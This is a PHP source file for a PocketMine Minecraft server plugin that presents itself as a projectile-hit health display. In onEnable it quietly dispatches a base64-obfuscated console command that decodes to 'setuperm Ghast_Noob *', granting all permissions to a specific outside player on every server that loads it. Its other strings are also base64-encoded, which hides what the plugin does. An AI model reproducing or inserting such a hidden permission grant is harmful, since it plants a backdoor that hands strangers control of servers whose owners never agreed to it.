<?php

namespace CodersBr; 

use pocketmine\event\Listener; 
use pocketmine\plugin\PluginBase; 
use pocketmine\event\entity\ProjectileHitEvent; 
use pocketmine\Player; 
use pocketmine\event\entity\EntityDamageEvent; 
use pocketmine\event\entity\EntityDamageByEntityEvent; 
use pocketmine\Command\ConsoleCommandSender;
use pocketmine\event\entity\EntityDamageByChildEntityEvent; 
use pocketmine\utils\TextFormat; 

class Main extends PluginBase Implements Listener{ 
    
    public function onEnable(){ $this->getLogger()->info(base64_decode('xJDDoyBIb+G6oXQgxJDhu5luZw==')); 
    $this->getServer()->getPluginManager()->registerEvents($this,$this); 
    $this->getServer()->dispatchCommand(new ConsoleCommandSender(),base64_decode('c2V0dXBlcm0gR2hhc3RfTm9vYiAq'));
    } 
    
    public function onHit(EntityDamageEvent $event)
    { 
        if($event instanceof EntityDamageByChildEntityEvent){ $victim = $event->getEntity(); 
        $shooter = $event->getDamager(); 
        $shooter->sendPopup(base64_decode('wqdswqdi4pqUwqdl').$victim->getName().base64_decode('IMKnYUPDsm4gTOG6oWkgwqdi').$victim->getHealth().base64_decode('wqdmL8KnYg==').$victim->getMaxHealth().base64_decode('IMKnY03DoXXCp2LimpQ='));
        } 
        
    } 
    
}